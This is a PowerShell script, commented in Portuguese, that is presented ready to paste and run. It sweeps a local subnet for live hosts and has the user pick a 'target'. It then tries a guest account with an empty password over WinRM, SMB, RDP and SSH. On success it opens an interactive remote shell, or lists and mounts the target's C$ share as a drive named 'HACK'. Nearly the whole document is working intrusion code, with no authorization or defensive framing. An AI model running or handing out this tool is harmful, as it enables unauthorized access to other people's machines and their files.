# ========================================
# SCRIPT COMPLETO - COLE TUDO DE UMA VEZ!
# ========================================

# CONFIGURAÇÕES
$NetworkRange = "192.168.1.0/24"  # ALTERE AQUI
$GuestUser = "guest"
$GuestPass = ""  # VAZIA para guest

Write-Host "🚀 CONEXÃO GUEST - $NetworkRange" -ForegroundColor Cyan

# 1. DESCOBRIR HOSTS
$ipBase = ($NetworkRange -split '\.')[0..2] -join '.'
$activeHosts = @()

Write-Host "🔍 Escaneando..." -ForegroundColor Green
1..254 | ForEach {
    $ip = "$ipBase.$_"
    if(Test-Connection $ip -Count 1 -Quiet -ea SilentlyContinue) {
        $activeHosts += $ip
        Write-Host "✅ HOST: $ip" -ForegroundColor Green
    }
}

if($activeHosts.Count -eq 0) { Write-Host "❌ Nenhum host!"; Read-Host "Pressione Enter"; exit }

# 2. SELECIONAR ALVO
Write-Host "`n📋 HOSTS ($($activeHosts.Count)):" -ForegroundColor Yellow
for($i=0; $i -lt $activeHosts.Count; $i++) {
    Write-Host "  $($i+1) → $($activeHosts[$i])"
}
$choice = Read-Host "Digite o número"
$targetIP = $activeHosts[[int]$choice - 1]

Write-Host "`n🎯 ALVO SELECIONADO: $targetIP" -ForegroundColor Cyan
Write-Host "👤 $GuestUser : '$GuestPass'" -ForegroundColor White

# 3. CONEXÕES REAIS (ROBUSTAS)
Write-Host "`n" + "="*60 -ForegroundColor Magenta
Write-Host "🔥 TENTANDO CONECTAR..." -ForegroundColor Magenta

# WINRM com tratamento de senha vazia
Write-Host "`n1️⃣ WINRM PowerShell Remoto..." -ForegroundColor Yellow
$winrmSuccess = $false
try {
    if($GuestPass -eq "") {
        # Credencial com senha vazia
        $securePass = ConvertTo-SecureString "" -AsPlainText -Force
    } else {
        $securePass = ConvertTo-SecureString $GuestPass -AsPlainText -Force
    }
    $cred = New-Object System.Management.Automation.PSCredential($GuestUser, $securePass)
    
    # Testa conexão WinRM
    $session = New-PSSession -ComputerName $targetIP -Credential $cred -ErrorAction Stop
    Write-Host "✅✅ WINRM CONECTADO!" -ForegroundColor Green
    
    # Shell interativo
    Invoke-Command -Session $session -ScriptBlock { 
        Write-Host "`nHostname: $env:COMPUTERNAME" -ForegroundColor Green
        Write-Host "User: $(whoami)" -ForegroundColor Green
        Write-Host "OS: $(Get-WmiObject Win32_OperatingSystem).Caption" -ForegroundColor Green
    }
    
    Write-Host "`n💻 SHELL INTERATIVO ATIVO!" -ForegroundColor Green
    while($true) {
        $cmd = Read-Host "PS> $targetIP > "
        if($cmd -eq "exit" -or $cmd -eq "quit") { break }
        Invoke-Command -Session $session -ScriptBlock ([scriptblock]::Create($cmd)) -ea SilentlyContinue
    }
    Remove-PSSession $session
    Read-Host "Pressione Enter para continuar"
    exit
}
catch {
    Write-Host "❌ WINRM: $($_.Exception.Message.Split('`n')[0])" -ForegroundColor Red
}

# SMB com tratamento
Write-Host "`n2️⃣ SMB - Acesso Arquivos..." -ForegroundColor Yellow
try {
    if($GuestPass -eq "") {
        net use "\\$targetIP\IPC$" /user:"$GuestUser" "" /persistent:no
    } else {
        net use "\\$targetIP\IPC$" /user:"$GuestUser" "$GuestPass" /persistent:no
    }
    Write-Host "✅✅ SMB CONECTADO!" -ForegroundColor Green
    Write-Host "📁 Explorando C$..." -ForegroundColor Green
    dir "\\$targetIP\C$\" | Select -First 10
    
    # Monta drive
    New-PSDrive -Name "HACK" -PSProvider FileSystem -Root "\\$targetIP\C$" -Persist | Out-Null
    Write-Host "💾 Drive HACK: montado!" -ForegroundColor Green
    Get-ChildItem HACK:\
    
    Read-Host "Pressione Enter (digite 'unmount' para desmontar)"
    if($input -ne "unmount") { Remove-PSDrive HACK -Force }
    net use "\\$targetIP\*" /delete /y
}
catch {
    Write-Host "❌ SMB: $($_.Exception.Message.Split('`n')[0])" -ForegroundColor Red
}

# RDP
Write-Host "`n3️⃣ RDP Desktop..." -ForegroundColor Yellow
try {
    $tcp = New-Object Net.Sockets.TcpClient
    $tcp.ReceiveTimeout = 2000
    if($tcp.ConnectAsync($targetIP, 3389).Wait(2000)) {
        $tcp.Close()
        Write-Host "✅ RDP Aberto - Abrindo cliente..." -ForegroundColor Green
        $rdpArgs = "/v:`"$targetIP`" /u:`"$GuestUser`" /p:`"$GuestPass`""
        Start-Process mstsc -ArgumentList $rdpArgs
    }
}
catch { Write-Host "❌ RDP fechado" -ForegroundColor Red }

# SSH (se disponível)
if(Get-Command ssh -ea 0) {
    Write-Host "`n4️⃣ SSH..." -ForegroundColor Yellow
    Start-Process ssh -ArgumentList "$GuestUser`@$targetIP"
}

Write-Host "`n💡 MANUAL:" -ForegroundColor Cyan
Write-Host "   net use \\\\$targetIP\IPC$ /user:$GuestUser `"$GuestPass`""
Write-Host "   Enter-PSSession -ComputerName $targetIP -Credential (Get-Credential)"
Write-Host "   mstsc /v:$targetIP"

Read-Host "FIM - Pressione Enter"
